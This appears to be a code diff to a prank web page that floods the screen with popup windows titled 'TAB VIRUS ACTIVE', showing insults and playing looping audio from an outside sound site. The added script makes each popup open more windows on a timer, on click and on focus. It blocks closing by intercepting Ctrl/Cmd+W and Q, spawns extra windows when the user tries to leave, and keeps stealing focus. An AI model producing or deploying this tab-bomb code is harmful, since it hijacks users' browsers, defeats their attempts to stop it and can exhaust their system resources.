@@ -44,8 +44,22 @@
   </style>
   <script>
     let tabCount = 5;
+    let dramaticTrack;
+    const dramaticMusicUrl = "https://www.myinstants.com/media/sounds/epic.mp3";
+    const errorSoundUrl = "https://www.myinstants.com/media/sounds/erro.mp3";
+
+    function playDramaticMusic() {
+      if (!dramaticTrack) {
+        dramaticTrack = new Audio(dramaticMusicUrl);
+        dramaticTrack.loop = true;
+        dramaticTrack.volume = 0.6;
+      }
+      dramaticTrack.currentTime = 0;
+      dramaticTrack.play().catch(() => {});
+    }
 
     function unleashTabs() {
+      playDramaticMusic();
       for (let i = 0; i < tabCount; i++) {
         spawnTab();
       }
@@ -67,36 +81,110 @@
 
       const colors = ["red", "green", "blue", "purple", "yellow", "cyan", "orange"];
       const color = colors[Math.floor(Math.random() * colors.length)];
-      const features = `width=300,height=300,left=${Math.random()*screen.availWidth},top=${Math.random()*screen.availHeight}`;
+      const features = `width=360,height=360,left=${Math.random() * screen.availWidth},top=${Math.random() * screen.availHeight}`;
       const win = window.open("", "", features);
       if (!win) return;
 
-      // Play a beep sound (base64)
-      const audio = new Audio("data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAESsAACJWAAACABAAZGF0YQAAAAA=");
-      audio.play();
+      const errorAudio = new Audio(errorSoundUrl);
+      errorAudio.volume = 0.6;
+      errorAudio.play().catch(() => {});
 
       const insult = insults[Math.floor(Math.random() * insults.length)];
+      const sanitizedInsult = insult
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+      const parentUrl = window.location.href;
 
-      win.document.body.style.margin = 0;
-      win.document.body.style.height = "100vh";
-      win.document.body.style.display = "flex";
-      win.document.body.style.alignItems = "center";
-      win.document.body.style.justifyContent = "center";
-      win.document.body.style.fontSize = "20px";
-      win.document.body.style.textAlign = "center";
-      win.document.body.style.backgroundColor = color;
-      win.document.title = "TAB VIRUS ACTIVE";
-      win.document.body.innerHTML = `<div>${insult}</div>`;
+      const htmlContent = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>TAB VIRUS ACTIVE</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: 20px;
+      font-weight: bold;
+      color: #fff;
+      background: ${color};
+    }
+    .insult {
+      padding: 25px;
+      background: rgba(0, 0, 0, 0.7);
+      border: 4px solid #ff0000;
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
+      text-shadow: 0 0 10px #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="insult">${sanitizedInsult}</div>
+  <audio src="${dramaticMusicUrl}" autoplay loop></audio>
+  <script>
+    (function() {
+      const colors = ${JSON.stringify(colors)};
+      const body = document.body;
+      const baseUrl = ${JSON.stringify(parentUrl)};
 
-      // Flashing colors
+      function demandMoreTabs(amount) {
+        if (window.opener && !window.opener.closed && typeof window.opener.spawnTab === 'function') {
+          for (let i = 0; i < amount; i++) {
+            window.opener.spawnTab();
+          }
+        } else {
+          for (let i = 0; i < amount; i++) {
+            window.open(baseUrl, '_blank');
+          }
+        }
+      }
+
       setInterval(() => {
-        const newColor = colors[Math.floor(Math.random() * colors.length)];
-        win.document.body.style.backgroundColor = newColor;
-      }, 300);
+        body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+      }, 250);
 
-      // Bouncing
-      let dx = Math.random() > 0.5 ? 10 : -10;
-      let dy = Math.random() > 0.5 ? 10 : -10;
+      setInterval(() => demandMoreTabs(1 + Math.floor(Math.random() * 2)), 3500);
+
+      window.addEventListener('click', () => demandMoreTabs(3));
+
+      window.addEventListener('focus', () => demandMoreTabs(1));
+
+      window.addEventListener('beforeunload', (event) => {
+        demandMoreTabs(5);
+        event.preventDefault();
+        event.returnValue = 'The tab vortex refuses to close!';
+      });
+
+      window.addEventListener('keydown', (event) => {
+        if ((event.ctrlKey || event.metaKey) && (event.key.toLowerCase() === 'w' || event.key.toLowerCase() === 'q')) {
+          event.preventDefault();
+          demandMoreTabs(6);
+        }
+      });
+
+      setInterval(() => {
+        try {
+          window.focus();
+        } catch (err) {}
+      }, 2000);
+    })();
+  <\/script>
+</body>
+</html>`;
+
+      win.document.open();
+      win.document.write(htmlContent);
+      win.document.close();
+
+      let dx = Math.random() > 0.5 ? 12 : -12;
+      let dy = Math.random() > 0.5 ? 12 : -12;
       let x = win.screenX;
       let y = win.screenY;
 
@@ -107,18 +195,23 @@
           unleashTabs();
           return;
         }
+
         x += dx;
         y += dy;
 
-        if (x <= 0 || x + win.outerWidth >= screen.availWidth) dx *= -1;
-        if (y <= 0 || y + win.outerHeight >= screen.availHeight) dy *= -1;
+        if (x <= 0 || x + win.outerWidth >= screen.availWidth) {
+          dx *= -1;
+        }
+        if (y <= 0 || y + win.outerHeight >= screen.availHeight) {
+          dy *= -1;
+        }
 
         try {
           win.moveTo(x, y);
         } catch (e) {
           clearInterval(bounceInterval);
         }
-      }, 50);
+      }, 45);
     }
   </script>
 </head>
